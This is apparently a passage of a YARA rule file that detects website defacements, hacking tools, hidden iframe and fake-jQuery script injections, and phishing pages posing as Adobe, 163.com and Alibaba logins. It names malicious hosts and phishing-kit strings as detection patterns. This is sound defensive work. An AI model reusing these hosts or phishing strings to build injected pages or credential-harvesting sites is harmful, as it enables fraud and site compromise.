rule html_defaced_generic_105 : defaced
{
    strings:
        $trigger = "<title>Tr4xb0y ownz you"
    condition:
        $trigger
}

rule html_defaced_generic_106 : defaced
{
    strings:
        $trigger = "<title>Indonesian Freedom Security"
    condition:
        $trigger
}

rule html_defaced_generic_107 : defaced
{
    strings:
        $trigger = "<title>~pwn3d"
    condition:
        $trigger
}

rule html_defaced_generic_108 : defaced
{
    strings:
        $trigger = "<title>Zikter Here"
    condition:
        $trigger
}

private rule PR00225 : trigger
{
    strings:
        $ps0 = "reet"
    condition:
        $ps0
}

rule html_defaced_generic_109 : defaced
{
    strings:
        $trigger = "Kamu Bajingan"
    condition:
        $trigger and PR00225
}

private rule PR00226 : trigger
{
    strings:
        $ps0 = "<code>MY FRIENDS"
    condition:
        $ps0
}

rule html_defaced_generic_110 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00226
}

private rule PR00227 : trigger
{
    strings:
        $ps0 = "<title>Xai Syndicate"
    condition:
        $ps0
}

rule html_defaced_generic_111 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00227
}

private rule PR00228 : trigger
{
    strings:
        $ps0 = "<title>PwnZ by"
    condition:
        $ps0
}

rule html_defaced_generic_112 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR00228
}

rule html_defaced_generic_113 : defaced
{
    strings:
        $trigger = "<title>Ayy\xc4\xb1ld\xc4\xb1z Tim"
    condition:
        $trigger
}

rule html_defaced_generic_114 : defaced
{
    strings:
        $trigger = "<title>BLACK ILLUSION SECURITY"
    condition:
        $trigger
}

rule html_defaced_generic_115 : defaced
{
    strings:
        $trigger = "hacker by .moncef"
    condition:
        $trigger
}

rule html_defaced_generic_116 : defaced
{
    strings:
        $trigger = "Defaced by BILGEKULTIGIN</H1>"
    condition:
        $trigger
}

rule html_defaced_generic_118 : defaced
{
    strings:
        $trigger = "<title> Who_Cares?"
    condition:
        $trigger
}

rule html_defaced_generic_119 : defaced
{
    strings:
        $trigger = "<title>0x00"
    condition:
        $trigger
}

private rule PR00229 : trigger
{
    strings:
        $ps0 = "Muhamad Irhash Syn's <"
    condition:
        $ps0
}

rule html_defaced_generic_121 : defaced
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00229
}

rule html_defaced_generic_122 : defaced
{
    strings:
        $trigger = ">Egyptian Information Security Team"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_123 : defaced
{
    strings:
        $trigger = "<title>cr000tz"
    condition:
        $trigger
}

rule html_defaced_generic_128 : defaced
{
    strings:
        $trigger = "Hacked by G_OUULL"
    condition:
        $trigger
}

rule html_defaced_generic_130 : defaced
{
    strings:
        $trigger = "Edited By KingDefacer"
    condition:
        $trigger
}

private rule PR00230 : trigger
{
    strings:
        $ps0 = "Deadrz_404"
    condition:
        $ps0
}

rule html_defaced_generic_132 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR00230
}

rule html_defaced_generic_135 : defaced
{
    strings:
        $trigger = "<title>p0r7s</title>"
    condition:
        $trigger
}

rule html_defaced_generic_136 : defaced
{
    strings:
        $trigger = "<title>x-m0bY"
    condition:
        $trigger
}

rule html_defaced_generic_137 : defaced
{
    strings:
        $trigger = "HACKED BY SKYNET<"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_138 : defaced
{
    strings:
        $trigger = "Siber Konseyi / Mass </title>"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_139 : defaced
{
    strings:
        $trigger = "<title>-=> Qu4t4ck0"
    condition:
        $trigger
}

rule html_defaced_generic_140 : defaced
{
    strings:
        $trigger = "<title>Cvar1984</title>"
    condition:
        $trigger
}

rule html_defaced_generic_141 : defaced
{
    strings:
        $trigger = "<title>T0uch3d"
    condition:
        $trigger
}

rule html_defaced_generic_142 : defaced
{
    strings:
        $trigger = "<title>TurkHackTeam"
    condition:
        $trigger
}

rule html_defaced_generic_143 : defaced
{
    strings:
        $trigger = "<title>Mr.AL Was Here</title>"
    condition:
        $trigger
}

rule html_defaced_generic_144 : defaced
{
    strings:
        $trigger = "<title>Free Gaza"
    condition:
        $trigger
}

private rule PR00231 : trigger
{
    strings:
        $ps0 = "document.write(unescape("
    condition:
        $ps0
}

rule html_defaced_generic_145 : defaced
{
    strings:
        $trigger = "5F%69%66%72%65%6C%65%79%69%63%69"
    condition:
        $trigger and PR00231
}

rule html_defaced_generic_146 : defaced
{
    strings:
        $trigger = ">Dear Admin your Website"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_147 : defaced
{
    strings:
        $trigger = "Virus and Trojan</title>"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_148 : defaced
{
    strings:
        $trigger = ">H4CK3R N4O U5A"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_149 : defaced
{
    strings:
        $trigger = "InFamouz Was Here"
    condition:
        $trigger and PR00042
}

// MANUAL FIX NECESSARY
rule html_defaced_generic_150 : defaced
{
    strings:
        $trigger = "CK"
        $html_defaced_generic_150_r0 = /^[\s]*HACKED/
    condition:
        $trigger and $html_defaced_generic_150_r0
}

rule html_defaced_generic_152 : defaced
{
    strings:
        $trigger = "<title>hacked by hector"
    condition:
        $trigger
}

rule html_defaced_generic_153 : defaced
{
    strings:
        $trigger = "ALPHRA87"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_154 : defaced
{
    strings:
        $trigger = "Khazekira AR"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_155 : defaced
{
    strings:
        $trigger = "<title>PacmanCorp"
    condition:
        $trigger
}

rule html_defaced_generic_156 : defaced
{
    strings:
        $trigger = "Ayy\xc4\xb1ld\xc4\xb1z Tim"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_157 : defaced
{
    strings:
        $trigger = "0wn3d by"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_158 : defaced
{
    strings:
        $trigger = "DEFACE BY"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_159 : defaced
{
    strings:
        $trigger = "GalaxyXploiterTeam"
    condition:
        $trigger and PR00042
}

private rule PR00232 : trigger
{
    strings:
        $ps0 = "pwnd by"
    condition:
        $ps0
}

rule html_defaced_generic_160 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00232
}

rule html_defaced_generic_161 : defaced
{
    strings:
        $trigger = "AYYILDIZ"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_162 : defaced
{
    strings:
        $trigger = ">Rooted by"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_163 : defaced
{
    strings:
        $trigger = ">Payloud by"
    condition:
        $trigger
}

rule html_defaced_generic_164 : defaced
{
    strings:
        $trigger = "<title>touch by"
    condition:
        $trigger
}

rule html_defaced_generic_165 : defaced
{
    strings:
        $trigger = "document.write%28unescape%28%22%253Cscript%"
    condition:
        $trigger
}

rule html_defaced_generic_166 : defaced
{
    strings:
        $trigger = "Touched By Root"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_167 : defaced
{
    strings:
        $trigger = "Lutfie404"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_168 : defaced
{
    strings:
        $trigger = "Gambrush"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_170 : defaced
{
    strings:
        $trigger = "./Xlion<"
    condition:
        $trigger and PR00042
}

private rule PR00233 : trigger
{
    strings:
        $ps0 = "remotexdesktopshopv2</a>"
    condition:
        $ps0
}

rule html_defaced_generic_171 : defaced
{
    strings:
        $trigger = "<p style"
    condition:
        $trigger and PR00233
}

rule html_defaced_generic_172 : defaced
{
    strings:
        $trigger = ">Iran Cyber Security Group"
    condition:
        $trigger and PR00042
}

private rule PR00234 : trigger
{
    strings:
        $ps0 = "GrayHat Phantom"
    condition:
        $ps0
}

rule html_defaced_generic_173 : defaced
{
    strings:
        $trigger = "<iframe src="
    condition:
        $trigger and PR00234
}

rule html_defaced_generic_174 : defaced
{
    strings:
        $trigger = ">Spamtools.io"
    condition:
        $trigger
}

rule html_defaced_generic_175 : defaced
{
    strings:
        $trigger = ">Kissed by Gunawan"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_176 : defaced
{
    strings:
        $trigger = "UnknownSec"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_177 : defaced
{
    strings:
        $trigger = "<title>pwned</title>"
    condition:
        $trigger
}

private rule PR00235 : trigger
{
    strings:
        $ps0 = "Aslan Neferler Tim"
    condition:
        $ps0
}

rule html_defaced_generic_178 : defaced
{
    strings:
        $trigger = "://anthack."
    condition:
        $trigger and PR00042 and PR00235
}

rule html_defaced_generic_179 : defaced
{
    strings:
        $trigger = "<title>Touched By "
    condition:
        $trigger
}

private rule PR00236 : trigger
{
    strings:
        $ps0 = "Hacked by"
    condition:
        $ps0
}

private rule PR00237 : trigger
{
    strings:
        $ps0 = "getElementById"
    condition:
        $ps0
}

rule html_defaced_generic_180 : defaced
{
    strings:
        $trigger = "playAudio("
    condition:
        $trigger and PR00236 and PR00050 and PR00237
}

rule html_defaced_generic_181 : defaced
{
    strings:
        $trigger = "Pwndz"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_182 : defaced
{
    strings:
        $trigger = "XnerGondes"
    condition:
        $trigger and PR00042
}

rule html_defaced_generic_183 : defaced
{
    strings:
        $trigger = "f4y-xploit"
    condition:
        $trigger and PR00013
}

private rule PR00238 : trigger
{
    strings:
        $ps0 = "<title>GHOSTSEC-TEAM |"
    condition:
        $ps0
}

rule html_defaced_ghostsec_team_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00238
}

rule html_defaced_gokturk_ordusu_001 : defaced
{
    strings:
        $trigger = "rk Ordusu</title>"
    condition:
        $trigger and PR00042
}

private rule PR00239 : trigger
{
    strings:
        $ps0 = "only mail, n1cedre4m[at]yahoo[dot]com"
    condition:
        $ps0
}

rule html_defaced_Hmei7_001 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR00239
}

rule html_defaced_HorrorScary_001 : defaced
{
    strings:
        $trigger = "<title>./HorrorScary Was Here</title>"
    condition:
        $trigger
}

rule html_defaced_indonesia_001 : defaced
{
    strings:
        $trigger = "| Indonesia Cyber Army"
    condition:
        $trigger and PR00042
}

rule html_defaced_indonesia_002 : defaced
{
    strings:
        $trigger = "<title>SYSTEM LEMAH"
    condition:
        $trigger
}

rule html_defaced_indonesia_003 : defaced
{
    strings:
        $trigger = "<title>Indonesia To World Team"
    condition:
        $trigger
}

rule html_defaced_indonesia_004 : defaced
{
    strings:
        $trigger = "<title>Dispotube Indonesia"
    condition:
        $trigger
}

rule html_defaced_indonesia_005 : defaced
{
    strings:
        $trigger = "<title>IndonesianPeople!"
    condition:
        $trigger
}

private rule PR00240 : trigger
{
    strings:
        $ps0 = "WE ARE DEFACER INDONESIA"
    condition:
        $ps0
}

rule html_defaced_indonesia_006 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00240
}

rule html_defaced_indonesia_007 : defaced
{
    strings:
        $trigger = "INDONESIAN DEFACER"
    condition:
        $trigger and PR00042
}

rule html_defaced_indonesia_008 : defaced
{
    strings:
        $trigger = "IndoGhostSec<"
    condition:
        $trigger and PR00042
}

rule html_defaced_indonesia_009 : defaced
{
    strings:
        $trigger = "XenboyOfficial<"
    condition:
        $trigger and PR00042
}

rule html_defaced_jemroot_001 : defaced
{
    strings:
        $trigger = "<title>JemROOT"
    condition:
        $trigger
}

private rule PR00241 : trigger
{
    strings:
        $ps0 = "<h1>In The Name Of Allah</h1>"
    condition:
        $ps0
}

rule html_defaced_JOK3R_002 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR00241
}

rule html_defaced_l0s4r_001 : defaced
{
    strings:
        $trigger = "l0s4r"
    condition:
        $trigger and PR00042
}

rule html_defaced_lolzsec_001 : defaced
{
    strings:
        $trigger = "by LolzSec<"
    condition:
        $trigger and PR00042
}

rule html_defaced_madleets_001 : defaced
{
    strings:
        $trigger = "href=\"http://www.MadLeets.com\">"
    condition:
        $trigger and PR00042
}

rule html_defaced_Malaysia_Defacer_001 : defaced
{
    strings:
        $trigger = "content=\"Malaysia Defacer"
    condition:
        $trigger
}

rule html_defaced_monkeybluffy_001 : defaced
{
    strings:
        $trigger = "<title>Monkey B Luffy"
    condition:
        $trigger
}

rule html_defaced_MonstersDefacers_001 : defaced
{
    strings:
        $trigger = ">:: MonstersDefacers Team ::"
    condition:
        $trigger
}

rule html_defaced_MrAhmed_001 : defaced
{
    strings:
        $trigger = "alert(\"                ..:: HaCkeD By Mr-Ahmed"
    condition:
        $trigger
}

private rule PR00242 : trigger
{
    strings:
        $ps0 = "message[22] = \"Albalooshi\";"
    condition:
        $ps0
}

rule html_defaced_muslim_army_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00242
}

rule html_defaced_owned_001 : defaced
{
    strings:
        $trigger = "XaiSyndicate"
    condition:
        $trigger and PR00042
}

rule html_defaced_owned_002 : defaced
{
    strings:
        $trigger = "by iaM<"
    condition:
        $trigger and PR00042
}

rule html_defaced_owned_003 : defaced
{
    strings:
        $trigger = "by STMIK"
    condition:
        $trigger and PR00042
}

rule html_defaced_owned_004 : defaced
{
    strings:
        $trigger = "DayWalker"
    condition:
        $trigger and PR00042
}

private rule PR00243 : trigger
{
    strings:
        $ps0 = ">Owned By Ante"
    condition:
        $ps0
}

rule html_defaced_owned_005 : defaced
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00243
}

rule html_defaced_owned_006 : defaced
{
    strings:
        $trigger = "r00t"
    condition:
        $trigger and PR00042
}

rule html_defaced_owned_007 : defaced
{
    strings:
        $trigger = "GreetZ"
    condition:
        $trigger and PR00042
}

rule html_defaced_owned_008 : defaced
{
    strings:
        $trigger = ":Owned:"
    condition:
        $trigger and PR00042
}

rule html_defaced_p0r7s_001 : defaced
{
    strings:
        $trigger = ">p0r7s"
    condition:
        $trigger and PR00042
}

rule html_defaced_people_hurt_001 : defaced
{
    strings:
        $trigger = "<title>people_hurt |"
    condition:
        $trigger
}

rule html_defaced_persiangig_001 : defaced
{
    strings:
        $trigger = "<script type=\"text/javascript\" src=\"http://hellox.persiangig.com/DefacePage/"
    condition:
        $trigger
}

private rule PR00244 : trigger
{
    strings:
        $ps0 = "<h1 style=color:Red;>YOUR SYSTEM'S SECURITY HAS BEEN SHUTTED DOWN!"
    condition:
        $ps0
}

rule html_defaced_ph_haxxors_001 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00244
}

rule html_defaced_pwnd_by_001 : defaced
{
    strings:
        $trigger = "<title>Pwnd by"
    condition:
        $trigger
}

rule html_defaced_redsecurity_group_001 : defaced
{
    strings:
        $trigger = "Red-Security Group"
    condition:
        $trigger and PR00042
}

rule html_defaced_Red_Viper_001 : defaced
{
    strings:
        $trigger = "<title>Red V!per Was HeRe"
    condition:
        $trigger
}

private rule PR00245 : trigger
{
    strings:
        $ps0 = "From : Hell"
    condition:
        $ps0
}

rule html_defaced_shgaaoi_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00245
}

rule html_defaced_sinan_001 : defaced
{
    strings:
        $trigger = "http://i.hizliresim.com/EYL999.png"
    condition:
        $trigger and PR00042
}

rule html_defaced_sp4mp3d_001 : defaced
{
    strings:
        $trigger = "<title>Sp4mp3d By"
    condition:
        $trigger
}

rule html_defaced_TurkHackTeam_001 : defaced
{
    strings:
        $trigger = "www.turkhackteam"
    condition:
        $trigger
}

rule html_defaced_TurkHackTeam_002 : defaced
{
    strings:
        $trigger = "<title>Anka Neferler Tim"
    condition:
        $trigger
}

rule html_defaced_ZasieuN_001 : defaced
{
    strings:
        $trigger = "%3C%74%69%74%6C%65%3E%5A%61%73%69%65%75%4E%20"
    condition:
        $trigger and PR00224
}

private rule PR00246 : trigger
{
    strings:
        $ps0 = "<a href="
    condition:
        $ps0
}

rule html_dropper_kingtranslate_001 : dropper
{
    strings:
        $trigger = "base href=\"http://lp.kingtranslate.com"
    condition:
        $trigger and PR00246
}

rule html_hacktool_generic_001 : hacktool
{
    strings:
        $trigger = "<title>Havij - Report<"
    condition:
        $trigger
}

rule html_hacktool_generic_002 : hacktool
{
    strings:
        $trigger = "<title>:: k2ll33d ::</title>"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule html_hacktool_generic_003 : hacktool
{
    strings:
        $trigger = "<title"
        $html_hacktool_generic_003_r0 = /<title>[^<]{0,200}?[Ee3][Xx][Pp][Ll1][Oo0][Ii1][Tt][^aA][^<]{0,200}?<\/title>/
    condition:
        $trigger and $html_hacktool_generic_003_r0
}

private rule PR00247 : trigger
{
    strings:
        $ps0 = "<html"
    condition:
        $ps0
}

rule html_hacktool_mailer_001 : hacktool
{
    strings:
        $trigger = "Mailer by Sphinx"
    condition:
        $trigger and PR00247
}

private rule PR00248 : trigger
{
    strings:
        $ps0 = "<title> Inbox kabylieteam </title>"
    condition:
        $ps0
}

rule html_hacktool_mailer_002 : hacktool
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00248
}

private rule PR00249 : trigger
{
    strings:
        $ps0 = "obfuscator.obfuscate(document.getElementById("
    condition:
        $ps0
}

rule html_hacktool_mailer_003 : hacktool
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00249 and PR00046
}

private rule PR00250 : trigger
{
    strings:
        $ps0 = "<title>PayPal Account Checker - "
    condition:
        $ps0
}

rule html_hacktool_ppcheck_005 : hacktool
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00250
}

private rule PR00251 : trigger
{
    strings:
        $ps0 = "<input"
    condition:
        $ps0
}

rule html_hacktool_social_001 : hacktool
{
    strings:
        $trigger = ">Panel Liker Instagram"
    condition:
        $trigger and PR00042 and PR00046 and PR00251
}

rule html_hacktool_uploader_001 : hacktool
{
    strings:
        $trigger = "&nbsp; Evil Upload !!! </div>"
    condition:
        $trigger
}

private rule PR00252 : trigger
{
    strings:
        $ps0 = "analitics1.in"
    condition:
        $ps0
}

rule html_iframe_generic_001 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00252
}

private rule PR00253 : trigger
{
    strings:
        $ps0 = "/counter.php\" > </iframe><!--"
    condition:
        $ps0
}

rule html_iframe_generic_002 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00253
}

rule html_iframe_generic_003 : iframe
{
    strings:
        $trigger = ".dyndns.info/"
    condition:
        $trigger and PR00050
}

private rule PR00254 : trigger
{
    strings:
        $ps0 = ");}$_0=$GLOBALS['_"
    condition:
        $ps0
}

rule html_iframe_generic_004 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00254
}

rule html_iframe_generic_005 : iframe
{
    strings:
        $trigger = "<!-- counter --><script language="
    condition:
        $trigger
}

private rule PR00255 : trigger
{
    strings:
        $ps0 = "_on*/ $"
    condition:
        $ps0
}

rule html_iframe_generic_006 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00255
}

rule html_iframe_generic_007 : iframe
{
    strings:
        $trigger = "<iframe name=Twitter scrolling=auto"
    condition:
        $trigger
}

private rule PR00256 : trigger
{
    strings:
        $ps0 = "</iframe><!--/"
    condition:
        $ps0
}

rule html_iframe_generic_008 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00256
}

private rule PR00257 : trigger
{
    strings:
        $ps0 = ".split(\\\"\\\").reverse().join(\\\"\\\"));"
    condition:
        $ps0
}

rule html_iframe_generic_009 : iframe
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00050 and PR00257
}

rule html_iframe_generic_010 : iframe
{
    strings:
        $trigger = "if ($getArrWPForm[$urlWPThemeIndex]) echo \"$getArrWPForm[$urlWPThemeIndex]\\n\";"
    condition:
        $trigger and PR00050
}

private rule PR00258 : trigger
{
    strings:
        $ps0 = "chura.pl/rc/\""
    condition:
        $ps0
}

rule html_iframe_generic_012 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00258
}

private rule PR00259 : trigger
{
    strings:
        $ps0 = "src=\"http://cort.as/O2Ak"
    condition:
        $ps0
}

rule html_iframe_generic_013 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00259
}

private rule PR00260 : trigger
{
    strings:
        $ps0 = "iframe/index.php\" width=\"0\" height=\"0\" align=\"left\"></iframe>"
    condition:
        $ps0
}

rule html_iframe_generic_015 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00260
}

private rule PR00261 : trigger
{
    strings:
        $ps0 = "<ifram"
    condition:
        $ps0
}

rule html_iframe_generic_016 : iframe
{
    strings:
        $trigger = "src=\"http://stats3244-toolbar-google.ru/"
    condition:
        $trigger and PR00261
}

rule html_iframe_generic_017 : iframe
{
    strings:
        $trigger = "<iframe src=\"http://lskogujft"
    condition:
        $trigger
}

private rule PR00262 : trigger
{
    strings:
        $ps0 = "/hide.php"
    condition:
        $ps0
}

rule html_iframe_generic_019 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00262
}

rule html_iframe_generic_021 : iframe
{
    strings:
        $trigger = "<iframe src=\"<?php echo file_get_contents('http:"
    condition:
        $trigger
}

private rule PR00263 : trigger
{
    strings:
        $ps0 = "google.ru/in.cgi"
    condition:
        $ps0
}

rule html_iframe_google_ru_in_cgi_001 : iframe
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00263
}

rule html_iframe_wsapro_001 : iframe
{
    strings:
        $trigger = "<iframe src=\"http://web-service-amazon.pro/"
    condition:
        $trigger
}

rule html_injected_hcifx_001 : injected
{
    strings:
        $trigger = "src=\"http://www.hcifx.com/"
    condition:
        $trigger
}

private rule PR00264 : trigger
{
    strings:
        $ps0 = "function challs_flash_update()"
    condition:
        $ps0
}

rule html_malware_challs_uploader_interface_001 : malware
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00264
}

private rule PR00265 : trigger
{
    strings:
        $ps0 = "__FILE__"
    condition:
        $ps0
}

rule html_malware_dropper_002 : malware
{
    strings:
        $trigger = ">The \"HoeflerText\" font wasn't found.<"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR00266 : trigger
{
    strings:
        $ps0 = "src=\"//wibeee.com.ua"
    condition:
        $ps0
}

private rule PR00267 : trigger
{
    strings:
        $ps0 = "createElement"
    condition:
        $ps0
}

rule html_malware_dropper_003 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00266 and PR00267
}

rule html_malware_email_checker_001 : malware
{
    strings:
        $trigger = "<title>Dexter Checker</title>"
    condition:
        $trigger
}

private rule PR00268 : trigger
{
    strings:
        $ps0 = "http://gccanada.com/jquery.js"
    condition:
        $ps0
}

rule html_malware_fake_jquery_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00268
}

private rule PR00269 : trigger
{
    strings:
        $ps0 = "king.cash"
    condition:
        $ps0
}

rule html_malware_fake_jquery_001_02 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00269
}

private rule PR00270 : trigger
{
    strings:
        $ps0 = "/js/jquery.min.php?"
    condition:
        $ps0
}

rule html_malware_fake_jquery_002 : malware
{
    strings:
        $trigger = ");if(document.referrer.indexOf(location.protocol+\"//\"+location.host"
    condition:
        $trigger and PR00050 and PR00056 and PR00270
}

private rule PR00271 : trigger
{
    strings:
        $ps0 = "/js/jquery.min.php'"
    condition:
        $ps0
}

rule html_malware_fake_jquery_003 : malware
{
    strings:
        $trigger = "&utm_campaign"
    condition:
        $trigger and PR00271 and PR00050 and PR00056
}

rule html_malware_fakeCDN_001 : malware
{
    strings:
        $trigger = "securemaxcdn.com"
    condition:
        $trigger and PR00261
}

rule html_malware_g00_co_003_002 : malware
{
    strings:
        $trigger = "src=\"http://g00.co/BtFVPd\""
    condition:
        $trigger and PR00050
}

rule html_malware_iframe_glendaleoffice_001 : malware
{
    strings:
        $trigger = "<IFRAME SRC=\"http://glendaleoffice.com/"
    condition:
        $trigger
}

rule html_malware_img_src_001 : malware
{
    strings:
        $trigger = "/2c3r\" style"
    condition:
        $trigger
}

rule html_malware_log_viewer_001 : malware
{
    strings:
        $trigger = "<title>!LOG VIEW!"
    condition:
        $trigger
}

private rule PR00272 : trigger
{
    strings:
        $ps0 = "online-sale24.com/1.js'></script>"
    condition:
        $ps0
}

rule html_malware_online_sale24_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00272
}

private rule PR00273 : trigger
{
    strings:
        $ps0 = "header(\"Location:"
    condition:
        $ps0
}

rule html_phishing_126_com_001 : phishing
{
    strings:
        $trigger = "\"Location:http://mail.126.com/\""
    condition:
        $trigger and PR00273
}

private rule PR00274 : trigger
{
    strings:
        $ps0 = "<script id=\"jsBase\" type=\"text/javascript\" src=\"http://mimg.127.net/index/lib/"
    condition:
        $ps0
}

private rule PR00275 : trigger
{
    strings:
        $ps0 = ".php"
    condition:
        $ps0
}

rule html_phishing_126_com_002 : phishing
{
    strings:
        $trigger = "\"http://reg.163.com/"
    condition:
        $trigger and PR00274 and PR00261 and PR00275
}

rule html_phishing_163_com_001 : phishing
{
    strings:
        $trigger = "header(\"Location:http://vip.163.com/\""
    condition:
        $trigger
}

private rule PR00276 : trigger
{
    strings:
        $ps0 = "\"Location:http://mail.163.com/\""
    condition:
        $ps0
}

rule html_phishing_163_com_002 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00276
}

private rule PR00277 : trigger
{
    strings:
        $ps0 = "href=\"http://reg.163.com/getpasswd/RetakePassword.jsp?from="
    condition:
        $ps0
}

rule html_phishing_163_com_003 : phishing
{
    strings:
        $trigger = ".php"
    condition:
        $trigger and PR00277 and PR00261
}

rule html_phishing_1and1hosting_001 : phishing
{
    strings:
        $trigger = "<title>1&amp;1 Kunden-Login"
    condition:
        $trigger
}

rule html_phishing_adobe_001 : phishing
{
    strings:
        $trigger = "<title>Sign in - Adobe "
    condition:
        $trigger
}

rule html_phishing_adobe_002 : phishing
{
    strings:
        $trigger = "Adobe Sign In</title>"
    condition:
        $trigger and PR00042
}

private rule PR00278 : trigger
{
    strings:
        $ps0 = "Account"
    condition:
        $ps0
}

rule html_phishing_adobe_003 : phishing
{
    strings:
        $trigger = "*Your Email Provider Requires Authentication* *Please Login to View Document*"
    condition:
        $trigger and PR00042 and PR00278
}

rule html_phishing_adobe_004 : phishing
{
    strings:
        $trigger = "<title>Adobe PDF</title>"
    condition:
        $trigger
}

rule html_phishing_adobe_005 : phishing
{
    strings:
        $trigger = "<title>Adobe Document Cloud<"
    condition:
        $trigger
}

private rule PR00279 : trigger
{
    strings:
        $ps0 = "$message"
    condition:
        $ps0
}

rule html_phishing_adobe_006 : phishing
{
    strings:
        $trigger = "ocation: https://acrobat.adobe.com/"
    condition:
        $trigger and PR00279
}

// MANUAL FIX NECESSARY
rule html_phishing_adobe_007 : phishing
{
    strings:
        $trigger = "<title"
        $html_phishing_adobe_007_r0 = /<title>[\s]*[Pp]rivate[\s]*[Oo]nline[\s]*PDF[\s]*[Ff]ile</
    condition:
        $trigger and $html_phishing_adobe_007_r0
}

rule html_phishing_adobe_008 : phishing
{
    strings:
        $trigger = ">Ad0be Document Cloud"
    condition:
        $trigger and PR00042
}

rule html_phishing_adobe_009 : phishing
{
    strings:
        $trigger = "<title>Adobe Document"
    condition:
        $trigger
}

private rule PR00280 : trigger
{
    strings:
        $ps0 = "<title>Adobe Online"
    condition:
        $ps0
}

rule html_phishing_adobe_010 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00280
}

private rule PR00281 : trigger
{
    strings:
        $ps0 = "Login"
    condition:
        $ps0
}

rule html_phishing_adobe_011 : phishing
{
    strings:
        $trigger = "Adobe Online Services"
    condition:
        $trigger and PR00042 and PR00281
}

private rule PR00282 : trigger
{
    strings:
        $ps0 = "<title>Please Hold...Checking Info</title>"
    condition:
        $ps0
}

rule html_phishing_adobe_012 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00282
}

rule html_phishing_adobe_013 : phishing
{
    strings:
        $trigger = "<title>Share Point Online</title>"
    condition:
        $trigger
}

rule html_phishing_adobe_014 : phishing
{
    strings:
        $trigger = "%0A%3Ctitle%3EAdobe%20Online%20Viewer"
    condition:
        $trigger and PR00231
}

private rule PR00283 : trigger
{
    strings:
        $ps0 = "<form action=\"alilogon.php\" method=\"post\">"
    condition:
        $ps0
}

rule html_phishing_alibaba_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00283
}

private rule PR00284 : trigger
{
    strings:
        $ps0 = "<title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-"
    condition:
        $ps0
}

rule html_phishing_alibaba_002 : phishing
{
    strings:
        $trigger = ">Login to Message Center<"
    condition:
        $trigger and PR00284
}

private rule PR00285 : trigger
{
    strings:
        $ps0 = "invalid username or password"
    condition:
        $ps0
}

rule html_phishing_alibaba_002_02 : phishing
{
    strings:
        $trigger = "<title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-"
    condition:
        $trigger and PR00285 and PR00281
}

private rule PR00286 : trigger
{
    strings:
        $ps0 = "javascript:void(0);\">Sign in to Alibaba.com</a>"
    condition:
        $ps0
}

rule html_phishing_alibaba_002_03 : phishing
{
    strings:
        $trigger = "<title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-"
    condition:
        $trigger and PR00286 and PR00281
}

rule html_phishing_alibaba_003 : phishing
{
    strings:
        $trigger = "<title>Alibaba&nbsp;Manufacturer"
    condition:
        $trigger and PR00278
}

rule html_phishing_alibaba_004 : phishing
{
